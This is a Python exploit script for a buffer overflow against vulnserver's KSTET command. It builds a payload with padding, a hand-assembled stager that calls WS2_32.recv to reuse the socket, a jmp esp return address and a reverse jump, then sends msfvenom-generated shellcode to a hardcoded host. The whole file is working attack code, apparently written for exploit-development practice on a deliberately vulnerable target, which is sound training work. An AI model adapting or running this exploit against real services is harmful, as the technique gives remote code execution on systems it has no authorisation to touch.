#!/usr/bin/python3
#
# Script for buffer overflow socket reuse using WS2_32.recv
#

import socket
import binascii
import sys

# UPDATE THIS BLOCK
# #########################################################################################

SOCKET_BUFF_SIZE = 2048

# Params example for vulnserver KSTET
rhost = "10.2.31.146"		# remote host
rport = 9999			# remote port
buffsize = 500			# buffer size
buffhead = "KSTET "		# buffer head / crash string
offset = 70			# eip offset
eip = "625011BB"		# jmp esp addr

# Call winsocket.recv
# Ref.: https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
# REMEMBER TO: recalc params and replace in string
call = "54"		# PUSH ESP
call += "5A"		# POP EDX
call += "6681C28801"	# ADD DX, 0x18 <-- socket
call += "54"		# PUSH ESP
call += "59"		# POP ECX
call += "6683E90A"	# SUB CX, 10 <-- *buf
call += "31DB"		# XOR EBX, EBX
call += "B702"		# MOV BH, 0x2 <-- len
call += "31C0"		# XOR EAX, EAX
call += "83EC50"	# SUB ESP, 0x50 <-- flags
call += "50"		# PUSH EAX
call += "53"		# PUSH EBX
call += "51"		# PUSH ECX
call += "FF32"		# PUSH [EDX]
call += "B8112C2540"	# MOV EAX, 0x40252C11	<-- WS2_32.recv addr (0x0040252C)
call += "C1E808"	# SHR EAX, 8
call += "FFD0"		# CALL EAX

# Reverse jmp
# REMEMBER TO: recalc and update string
revJmp = "EBB7"		# JMP $-0x47 <-- reverse jmp size

# Shell code
# Generated with msfvenom
# Example: msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f hex EXITFUNC=thread
shellCode = "ba9e85ea5edad5d97424f45b2bc9b13131531303531383eb62671fa272eae05b828b69beb38b0ecae33b449e0fb7080b84b5843c2d73f373ae28c7122c3314f50dfc69f44ae180a4036d3659203b8bd27aad8b07caccba9941971c1b86a31403cb8eefb83f64ee680e855d55bf749f910767eaeb741aed2f07c078b4af83db104e47bdd35c2cc9bc40b31eb77c38a118f57a86bc5ed8a7e53a8fd8f6e5707d7c0b640cdf417b8265277b9c651714adeef8633225bd8cd0eccb244d6576296e53b454ed5644a3ed1241efa9cf3b605cf0e88175936f12157a0a92bc82"		

# #########################################################################################
# #########################################################################################

# Binary hex strings
callWinSocketRecv = binascii.unhexlify(call)
reverseJmp = binascii.unhexlify(revJmp)
shell = binascii.unhexlify(shellCode)

# Bin values
buffHeadBin = str.encode(buffhead)
eipBin = binascii.unhexlify("".join(reversed([eip[i:i+2] for i in range(0, len(eip), 2)])))

# Nops
nopsCall = b'\x90' * 12
nopsJmp = b'\x90' * 2

# Offset
offsetBin = b'A' * (offset - len(nopsCall) - len(callWinSocketRecv) - len(nopsCall) )

# Tail
tail = b'Z' * (buffsize - len(offsetBin) - len(nopsCall) - len(callWinSocketRecv) - len(nopsCall) - len(eipBin) - len(nopsJmp) - len(reverseJmp) - len(nopsJmp))

# Payload
payload = buffHeadBin + offsetBin + nopsCall + callWinSocketRecv + nopsCall + eipBin + nopsJmp + reverseJmp + nopsJmp + tail	

# Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	# Connect to rhost and rport
	connect = s.connect((rhost, rport))
	print("Started socket communication")

	r = s.recv(SOCKET_BUFF_SIZE)
	print(r)

	# Send payload
	print("\nSending payload with size {}".format(len(payload)))
	print(payload)
	print("")

	s.send(payload)

	input("Press enter to send shellcode..\n")

	print("Sending shellcode:", shell)
		
	s.send(shell)

except KeyboardInterrupt:
	print("Exit: Keyboard Interrupt")
except:
	print("Error: Unexpected error.", sys.exc_info()[0])
	raise
finally:
	s.close()
